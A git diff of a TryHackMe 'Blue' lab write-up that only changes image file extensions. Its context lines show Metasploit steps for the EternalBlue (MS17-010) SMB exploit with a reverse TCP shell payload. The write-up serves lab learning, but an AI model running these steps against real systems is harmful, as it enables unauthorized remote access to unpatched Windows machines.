@@ -59,7 +59,7 @@ Right away, let's start `metasploit` a common and very powerfull vulnerability e
 
 Now, we can search for the `EternalBlue` vulnerability to see if there is a built in module for this in the tool. This cna be run with: `search eternalblue`
 
-![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_eternalblue.PNG?raw=true)
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_eternalblue.png?raw=true)
 
 To select it, we can run: `use exploit/windows/smb/ms17_010_eternalblue`
 
@@ -67,7 +67,7 @@ And we can see what needs to be chnaged inside of the modeule with the `options`
 
 msf exploit(ms17_010_eternalblue) > options
 
-![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_options.PNG?raw=true)
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_options.png?raw=true)
 
 As we can see, we need to set the `RHOSTS` option, so the exploit can run automatically. We can do this by simply adding:
 
@@ -83,7 +83,7 @@ set payload windows/x64/shell/reverse_tcp
 
 Time to run the exploit:
 
-![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_run.PNG?raw=true)                                                                              
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_run.png?raw=true)                                                                              
 
 And there we go, we have access to the machine. On to Task 3
                                                                                               
